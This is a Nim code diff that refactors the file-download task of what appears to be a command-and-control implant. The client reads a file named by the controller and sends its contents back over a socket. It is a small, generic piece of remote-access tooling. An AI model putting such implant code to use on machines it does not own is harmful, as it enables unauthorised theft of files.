@@ -1,19 +1,17 @@
-when defined(server):
-  import asyncdispatch, json
-  import ../server/[types, communication]
+import std/[net, base64, json, os]
+import ../client/communication
 
-when defined(client):
-  import net, base64
-  import ../client/communication
+proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
+  let taskOutput = TaskOutput(
+    task: "output",
+    taskId: taskId,
+    error: "",
+    data: %*{}
+  )
 
-when defined(server):
-  proc sendTask*(client: C2Client, path: string): Future[Task] {.async.} =
-    return await client.sendClientTask("download", %*{ "path": path })
-
-when defined(client):
-  proc executeTask*(client: Socket, taskId: int, path: string) =
-    try:
-      let contents: string = readFile(path)
-      client.sendFile(taskId, path, encode(contents))
-    except IOError:
-      client.sendFile(taskId, path, "", "File " & path & " does not exist!")
+  try:
+    let contents: string = readFile(params[0])
+    taskOutput.addData(DataType.File, splitPath(params[0]).tail, contents)
+  except IOError:
+    taskOutput.error = getCurrentExceptionMsg()
+  socket.sendOutput(taskOutput)
